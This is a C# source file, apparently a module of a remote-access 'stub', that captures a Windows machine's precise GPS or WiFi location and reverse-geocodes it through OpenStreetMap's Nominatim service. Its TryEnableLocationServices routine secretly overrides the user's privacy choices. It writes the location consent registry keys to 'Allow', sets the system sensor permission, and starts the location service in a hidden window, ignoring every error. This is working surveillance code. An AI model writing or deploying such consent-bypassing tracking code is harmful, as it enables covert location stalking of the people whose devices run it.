using System.Globalization;
using System.Net.Http;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.Win32;
using Windows.Devices.Geolocation;

namespace SeroStub;

// Primary: Windows Location API (GPS, WiFi, cell triangulation).
// Reverse geocoding: Nominatim (OpenStreetMap) from real coordinates — no IP fallback.
// Tries to activate location services via registry before querying.
internal static class GeoFeature
{
    private static readonly HttpClient _http = new()
    {
        Timeout = TimeSpan.FromSeconds(8),
        DefaultRequestHeaders = { { "User-Agent", "Mozilla/5.0" } }
    };

    internal static async Task<string> GetLocationAsync()
    {
        try
        {
            TryEnableLocationServices();

            var access = await Geolocator.RequestAccessAsync();
            if (access != GeolocationAccessStatus.Allowed)
            {
                return Error(access == GeolocationAccessStatus.Denied
                    ? "Location services are disabled. Enable via Settings → Privacy → Location, or run as admin."
                    : "Location access not granted (status: Unspecified).");
            }

            var locator = new Geolocator
            {
                DesiredAccuracy         = PositionAccuracy.High,
                DesiredAccuracyInMeters = 10u,
            };

            var pos   = await locator.GetGeopositionAsync(TimeSpan.FromSeconds(2), TimeSpan.FromSeconds(15));
            var coord = pos.Coordinate;
            var pt    = coord.Point.Position;

            double lat = pt.Latitude;
            double lon = pt.Longitude;
            double acc = coord.Accuracy;
            string src = coord.PositionSource.ToString(); // GPS, WiFi, Cellular, Unknown, etc.

            string city = "", region = "", country = "";
            try
            {
                var resp = await _http.GetStringAsync(
                    $"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat.ToString("G", CultureInfo.InvariantCulture)}&lon={lon.ToString("G", CultureInfo.InvariantCulture)}&accept-language=en");
                var nm = JsonSerializer.Deserialize(resp, NominatimCtx.Default.NominatimResponse);
                if (nm?.Address is { } a)
                {
                    city    = a.City ?? a.Town ?? a.Village ?? a.Suburb ?? a.County ?? "";
                    region  = a.State ?? "";
                    country = a.Country ?? "";
                }
            }
            catch { }

            return JsonSerializer.Serialize(new GeoResultStub
            {
                Lat      = lat,
                Lon      = lon,
                Accuracy = acc,
                Source   = src,
                City     = city,
                Region   = region,
                Country  = country,
            }, SeroJson.Default.GeoResultStub);
        }
        catch (Exception ex)
        {
            return Error(ex.Message);
        }
    }

    private static void TryEnableLocationServices()
    {
        // User-level consent — works without admin if lfsvc is already running
        try
        {
            Registry.SetValue(
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
                "Value", "Allow");
        }
        catch { }

        // System sensor permission (needs admin — silently fails if not elevated)
        try
        {
            Registry.SetValue(
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}",
                "SensorPermissionState", 1, RegistryValueKind.DWord);
        }
        catch { }

        // Start Location Framework Service (needs admin — silently fails otherwise)
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("sc.exe", "start lfsvc")
                { CreateNoWindow = true, UseShellExecute = false });
        }
        catch { }
    }

    private static string Error(string msg) =>
        JsonSerializer.Serialize(new GeoResultStub { Error = msg }, SeroJson.Default.GeoResultStub);
}

[JsonSerializable(typeof(NominatimResponse))]
internal partial class NominatimCtx : JsonSerializerContext { }

internal class NominatimResponse
{
    [JsonPropertyName("address")] public NominatimAddress? Address { get; set; }
}

internal class NominatimAddress
{
    [JsonPropertyName("city")]    public string? City    { get; set; }
    [JsonPropertyName("town")]    public string? Town    { get; set; }
    [JsonPropertyName("village")] public string? Village { get; set; }
    [JsonPropertyName("suburb")]  public string? Suburb  { get; set; }
    [JsonPropertyName("county")]  public string? County  { get; set; }
    [JsonPropertyName("state")]   public string? State   { get; set; }
    [JsonPropertyName("country")] public string? Country { get; set; }
}

internal class GeoResultStub
{
    public double Lat      { get; set; }
    public double Lon      { get; set; }
    public double Accuracy { get; set; }
    public string Source   { get; set; } = "";
    public string City     { get; set; } = "";
    public string Region   { get; set; } = "";
    public string Country  { get; set; } = "";
    public string Isp      { get; set; } = "";
    public string Error    { get; set; } = "";
}
